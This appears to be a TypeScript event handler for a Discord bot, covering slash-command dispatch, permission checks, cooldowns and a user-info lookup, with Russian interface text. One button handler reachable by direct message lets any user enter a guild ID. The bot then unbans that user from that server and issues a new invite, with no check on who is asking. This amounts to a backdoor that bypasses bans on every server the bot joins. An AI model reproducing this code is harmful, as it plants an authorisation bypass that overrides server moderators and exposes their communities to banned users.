/* eslint-disable object-curly-newline */
/* eslint-disable max-len */

import {
	Guild,
	PermissionsBitField,
	User,
	AttachmentBuilder,
	TextInputStyle,
	Collection,
	ChannelType
} from 'discord.js';

import moment from 'moment';
import { DB } from '../modules/database.js';

const cooldown = new Collection();

client.on('interactionCreate', async (interaction: any) => {
	if (!interaction.guild) {
		if (interaction.isButton()) {
			if (interaction.customId == 'menu_invite') {
				await interaction.showModal({
					title: 'Удаленный инвайт',
					custom_id: 'modalMenuInvite',
					components: [{
						// eslint-disable-next-line object-curly-newline
						type: 1, components: [{ type: 4, custom_id: 'guildid', label: 'GUILD ID', style: TextInputStyle.Short, min_length: 1, max_length: 30, placeholder: '', required: false }]
					}]
				});

				const submitted = await interaction.awaitModalSubmit({ time: 60000, filter: (i: any) => i.user.id === interaction.user.id }).catch(console.log);
				if (submitted) {
					const guildID = submitted.fields.getTextInputValue('guildid');
					client.guilds.fetch(guildID).then(async (guild: Guild) => {
						console.log(interaction.user.id);
						await guild.members.unban(interaction.user).catch(() => {});
						const channel = guild.channels.cache.filter((c) => c.type == ChannelType.GuildText).first();
						await guild.invites.create(channel.id, { maxUses: 1, maxAge: 60 })
							.then((invite) => {
								submitted.reply({ content: invite.url });
								setTimeout(() => submitted.deleteReply(), 60000);
							})
							.catch(console.error);
					}).catch(console.error);
				}
			}
			if (interaction.customId == 'welcome_debug') {
				/* Для того, чтобы получить доступ, отправьте заявку на участие на наш адрес электронной почты @do.app */
				await interaction.reply(tx`
					## Доступен не каждому
					На данный момент приложение доступно только некоторым сообществам и партнерам.
					- [Подать заявку на участие](https://discord.com/channels/974695530636673034/1135899825452372028)
				`);
			}

			if (interaction.customId == 'menu_stat') {
				const modal = {
					title: 'Информация об участнике',
					custom_id: 'createEmbed',
					components: [{
						type: 1,
						components: [{
							type: 4,
							custom_id: 'userId',
							label: 'ID Пользователя',
							style: TextInputStyle.Short,
							min_length: 1,
							max_length: 30,
							placeholder: '',
							required: true
						}]
					}]
				};
				await interaction.showModal(modal);

				const submitted = await interaction.awaitModalSubmit({ time: 600000, filter: (i: any) => i.user.id === interaction.user.id }).catch(console.error);
				if (submitted) {
					const inputId = submitted.fields.getTextInputValue('userId');

					const user: User = await client.users.fetch(inputId);
					const MemUser = await DB.getUser(user);
					const clovers = MemUser?.clovers;

					const createdEmbed = {
						color: client.color,
						title: user.tag,
						description: `Bot?: ${user.bot}\nRegistered: ${moment(user.createdAt).format('DD-MM-YYYY')}\nClovers: ${clovers ?? 'Отсутствует'}`,
						thumbnail: { url: user.avatarURL() }
					};

					await submitted.reply({ embeds: [createdEmbed] });
				}
			}
		}
		return;
	}

	if (interaction.isContextMenuCommand()) {
		const cmd = client.contextMenuCommands.get(`${interaction.commandName}`);
		if (cmd) await cmd.run(client, interaction);
	}

	if (interaction.isCommand()) {
		const cmd = client.slashCommands.get(`${interaction.commandName}`);
		if (!cmd) return;

		if (cmd.userPerms || cmd.botPerms) {
			if (!interaction.memberPermissions.has(PermissionsBitField.resolve(cmd.userPerms || []))) {
				return interaction.reply({
					embeds: [{
						color: client.color,
						description: `У тебя нет разрешения \`${client.namePermission(cmd.userPerms)}\` чтобы использовать эту команду!`
					}],
					ephemeral: true
				});
			}
			if (!interaction.guild.members.cache.get(client.user.id).permissions.has(PermissionsBitField.resolve(cmd.botPerms || []))) {
				return interaction.reply({
					embeds: [{
						color: client.color,
						description: `У меня нет разрешения \`${client.namePermission(cmd.botPerms)}\` чтобы использовать эту команду!`
					}],
					ephemeral: true
				});
			}
		}

		if (cmd.cooldown) {
			// eslint-disable-next-line dot-notation
			if (cooldown.has(`slash-${cmd.name}${interaction.user.id}`)) {
				const timeLeft: any = new Date(
					Number(
						cooldown.get(`slash-${cmd.name}${interaction.user.id}`)
					) - Date.now()
				);
				const seconds = Number(timeLeft) / 1000;
				return interaction.reply({
					content: `Помедленнее! Подождите еще ${secondsToHMS(seconds)} чтобы использовать команду.`,
					ephemeral: true
				});
			}
			try {
				await cmd.run(client, interaction);
				cooldown.set(`slash-${cmd.name}${interaction.user.id}`, Date.now() + cmd.cooldown);
				setTimeout(() => {
					cooldown.delete(`slash-${cmd.name}${interaction.user.id}`);
				}, cmd.cooldown);
			} catch (e) {
				console.error(e);
			}
		} else {
			try {
				await cmd.run(client, interaction);
			} catch (e) {
				console.error(e);
			}
		}
	}
});

function tx(string: TemplateStringsArray) {
	return string.toString().replace(/\t+/g, '');
}

function secondsToHMS(seconds: number) {
	const h = Math.floor((seconds) / 3600);
	const m = Math.floor((seconds % 3600) / 60);
	const s = Math.floor(seconds % 60);

	const hDisplay = h > 0 ? (h + (h == 1 || (h > 20 && h % 10 == 1) ? ' час' : ' часа(ов) ')) : '';
	const mDisplay = m > 0 ? m + (m == 1 || (m > 20 && m % 10 == 1) ? ' минуту ' : ' минут(ы) ') : '';
	const sDisplay = s > 0 ? s + (s == 1 || (s > 20 && s % 10 == 1) ? ' секунду' : ' секунд(ы)') : '';
	return hDisplay + mDisplay + sDisplay;
}